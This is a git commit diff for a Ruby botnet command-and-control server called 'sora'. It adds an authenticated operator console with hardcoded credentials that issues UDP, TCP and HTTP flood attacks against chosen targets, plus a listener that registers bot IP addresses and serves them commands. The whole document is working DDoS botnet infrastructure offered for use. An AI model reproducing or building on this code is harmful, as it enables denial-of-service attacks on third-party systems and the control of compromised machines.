a041e54bc293a666395b6933d43aa4304758081c
thecarterb <cbawsome77@gmail.com>
2017-05-01 10:05:12 -0400

    Make it work and add authentication

--- HttpBotnetServer/botmaster.rb
+++ HttpBotnetServer/botmaster.rb
@@ -1,5 +1,9 @@
+#!/usr/bin/env ruby
+
 require 'socket'
 
+uname = "botmaster"
+password = "ilovedogs"
 
 def checkAttackCmd(command)
   # TODO Check command arg length, resolve the hostname (if any)
@@ -13,61 +17,79 @@ def writeCmd(command)
   cmdf.close
 end
 
-server = TCPServer.new "0.0.0.0", 45678  # Change this if you want
+server = TCPServer.new "0.0.0.0", ARGV[0].to_i  # Change this if you want
 cmd = ''
 loop do
+  Thread.start(server.accept) do |master|
+    print "[*] Connection from #{master.peeraddr[3]}\n"
+    master.print "Username: "
+    inputted_uname = master.gets
+    master.print "Password: "
+    inputted_pass = master.gets
 
-  master = server.accept
-  print "[*] Connection from #{master.peeraddr[3]}"
-  master.print "
+    if inputted_uname.strip! != uname || inputted_pass.strip! != password
+      master.puts "Don't try it"
+      master.close
+    end
+    master.print "
 ███████╗     ██████╗     ██████╗      █████╗
 ██╔════╝    ██╔═══██╗    ██╔══██╗    ██╔══██╗
 ███████╗    ██║   ██║    ██████╔╝    ███████║
 ╚════██║    ██║   ██║    ██╔══██╗    ██╔══██║
 ███████║    ╚██████╔╝    ██║  ██║    ██║  ██║
 ╚══════╝     ╚═════╝     ╚═╝  ╚═╝    ╚═╝  ╚═╝\n\n"
-  while (cmd != 'exit')
+    while (cmd != 'exit')
+      begin
+        master.print "sora > "
 
-                 master.print "sora > "
-                 cmd = master.gets
-                 begin
-                   cmd = cmd.strip!
-                 rescue NoMethodError => nme # Prevents crash if client quits with CRTL+C
-                   next
-                 end
-                 puts cmd
-                 split = cmd.split(' ')
+        cmd = master.gets
+        begin
+         cmd = cmd.strip!
+        rescue NoMethodError => nme # Prevents crash if client quits with CRTL+C
+          next
+        end
+        puts cmd
+        split = cmd.split(' ')
 
-                 if cmd == "help"
-                   master.puts
-                   master.puts "udp <target> <time (ms)> <threads>        Perform a UDP flood on <target> for <time> milliseconds using <threads> threads per system"
-                   master.puts "tcp <target> <port> <time (ms)> <threads> Perform a TCP flood on <target>:<port> for <time> ms using <threads> threads"
-                   master.puts "http <target> <time (ms)> <threads>       Perform a HTTP flood on <target> for <time> ms using <threads> threads"
-                   master.puts "botcount                                  Shows how many bots are connected"
-                   master.puts
-                   master.puts "urlup <newurl>                            Update the url for bots to get connections from"
-                   master.puts
-                   master.puts "clear                                     Clear bot command (always do this after an attack command)"
-                   master.puts
-                   next
-                 elsif cmd == "botcount"
-                   master.puts(`wc -l bots.txt | awk '{print $1}'`)  # Some minor bash-fu
-                 elsif cmd.include?("udp") || cmd.include?("tcp") || cmd.include?("http")
-                   writeCmd(cmd) if checkAttackCmd(cmd)
-                 elsif cmd == "urlup" && split.length == 2
-                   writeCmd(cmd)
-                 elsif cmd == "clear"
-                   writeCmd("NONE")
-                 elsif cmd == ""
-                   next
-                 else
-                   master.puts "\033[31m Unknown command: #{cmd}\033[0m"
-                 end
+        if cmd == "help"
+          master.puts
+          master.puts "udp <target> <time (ms)> <threads>        Perform a UDP flood on <target> for <time> milliseconds using <threads> threads per system"
+          master.puts "tcp <target> <port> <time (ms)> <threads> Perform a TCP flood on <target>:<port> for <time> ms using <threads> threads"
+          master.puts "http <target> <time (ms)> <threads>       Perform a HTTP flood on <target> for <time> ms using <threads> threads"
+          master.puts "botcount                                  Shows how many bots are connected"
+          master.puts
+          master.puts "urlup <newurl>                            Update the url for bots to get connections from"
+          master.puts
+          master.puts "clear                                     Clear bot command (always do this after an attack command)"
+          master.puts
+          next
+        elsif cmd == "botcount"
+          master.puts(`wc -l bots.txt | awk '{print $1}'`)  # Some minor bash-fu
+        elsif cmd.include?("udp") || cmd.include?("tcp") || cmd.include?("http")
+          writeCmd(cmd) if checkAttackCmd(cmd)
+        elsif cmd == "urlup" && split.length == 2
+          writeCmd(cmd)
+        elsif cmd == "clear"
+          writeCmd("NONE")
+        elsif cmd == ""
+          next
+        else
+          master.puts "\033[31m Unknown command: #{cmd}\033[0m"
+        end
 
-
+      rescue Errno::EPROTOTYPE
+        next
+      rescue Errno::ECONNRESET
+        next
+      rescue Errno::EPIPE
+        next
+      rescue Errno::EADDRINUSE
+        puts ""
+      end
   end
   master.puts "Bye bye!"
   master.close
   cmd = ""
+  next
 
-end
+end end
--- HttpBotnetServer/server.rb
+++ HttpBotnetServer/server.rb
@@ -1,12 +1,29 @@
+#!/usr/bin/env ruby
+
+
 require 'socket'
 
-server = TCPServer.new("0.0.0.0", 6666)  # Change this to the port you have the client connecting to
+
+port = 6666  # CHANGE THIS
+masterport = 45678
+puts "
+_______ _______ ______ _______
+|     __|       |   __ \\   _   |
+|__     |   -   |      <       |
+|_______|_______|___|__|___|___|
+
+Made with <3 by AM-77
+
+To stop the server, type \`pkill ruby'\n"
+puts "[!] Starting bot listener on port #{port}"
+server = TCPServer.new("0.0.0.0", port)  # Change this to the port you have the client connecting to
 
 # Always override previous file
 cmdf = File.new("cmd.txt", 'w')
 cmdf.puts("NONE")
 cmdf.close
-system('ruby botmaster.rb &')
+puts "[!] Starting botmaster listener on port #{masterport}..."
+system("ruby botmaster.rb #{masterport} &")  # CHANGE THIS
 
 bot_file = File.new("bots.txt", 'a+')
 
@@ -14,10 +31,14 @@ loop do
 
   # Wait until client connects
   socket = server.accept
-  botfile.syswrite
+  if File.readlines("bots.txt").grep(/socket.peeraddr[3]/).any?
+    puts "[*] Conn from prev addr"
+    next
+  end
+  puts "[*] New connection from #{socket.peeraddr[3]}"
+  bot_file.write(socket.peeraddr[3])
 
   request = socket.gets
-
   STDERR.puts request
 
   cmd_file_read = File.new("cmd.txt", 'r')
